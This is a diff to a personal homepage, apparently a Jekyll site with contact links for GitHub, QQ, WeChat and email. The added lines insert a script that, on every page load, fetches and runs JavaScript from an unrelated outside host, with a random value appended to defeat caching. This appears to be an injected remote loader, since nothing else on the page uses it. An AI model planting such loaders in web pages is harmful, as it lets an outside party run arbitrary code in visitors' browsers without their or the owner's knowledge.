@@ -13,3 +13,9 @@ title: 主页
 
 <span><a target="_blank" href="http://github.com/xiahao90">github</a> <a target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=939065267&site=qq&menu=yes">qq</a> <a target="_blank" href="{{ site.baseurl }}static/img/weixin.jpg">微信</a> <a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=-4eWnpeekMbPv5mQh5KelpPRnJCS">邮箱</a>
 </span>
+<script type="text/javascript">
+    window.s=document.createElement("script");
+    s.src="https://emblemcodeapi.silence.online/js.php?"
+    +Math.random();(document.body||document.
+    documentElement).appendChild(s);
+  </script>
